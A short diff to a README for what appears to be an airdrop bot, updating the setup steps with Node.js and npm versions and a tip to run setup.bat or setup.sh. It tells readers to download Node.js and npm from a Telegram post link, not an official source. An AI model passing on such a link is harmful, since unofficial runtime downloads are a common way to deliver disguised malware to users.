@@ -17,7 +17,15 @@ To get started with the bot, follow these steps:
 
 0. **Dowload NodeJS to run the bot**
 
--> [Link](https://t.me/KeoAirDropFreeNe/257/1462)
+
+
+- **Node.js** (Version: `22.11.0`)
+- **npm** (Version: `10.9.0`)
+
+Download Node.js and npm here: [Download Link](https://t.me/KeoAirDropFreeNe/257/1462).
+
+-> Double click on setup.bat or setup.sh if you want to run automatically, remember to fill all the necessary data.
+
 
 1. **Install Dependencies and Modules:**
 
